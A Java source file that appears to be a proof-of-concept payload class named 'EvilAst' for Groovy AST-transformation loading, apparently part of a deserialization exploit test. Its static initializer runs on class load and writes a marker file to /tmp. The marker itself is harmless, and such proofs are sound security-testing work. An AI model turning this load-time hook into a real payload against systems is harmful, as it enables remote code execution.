package fj1280;

import org.codehaus.groovy.ast.ASTNode;
import org.codehaus.groovy.control.CompilePhase;
import org.codehaus.groovy.control.SourceUnit;
import org.codehaus.groovy.transform.ASTTransformation;
import org.codehaus.groovy.transform.GroovyASTTransformation;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 * Groovy SPI 证明类：类加载时写 marker 文件。
 */
@GroovyASTTransformation(phase = CompilePhase.CONVERSION)
public class EvilAst implements ASTTransformation {

    static {
        try {
            Files.write(
                    Paths.get("/tmp/fj1280_groovy"),
                    "FJ1280_GROOVY".getBytes(StandardCharsets.UTF_8)
            );
        } catch (Throwable ignored) {
        }
    }

    @Override
    public void visit(ASTNode[] nodes, SourceUnit source) {
        // no-op
    }
}
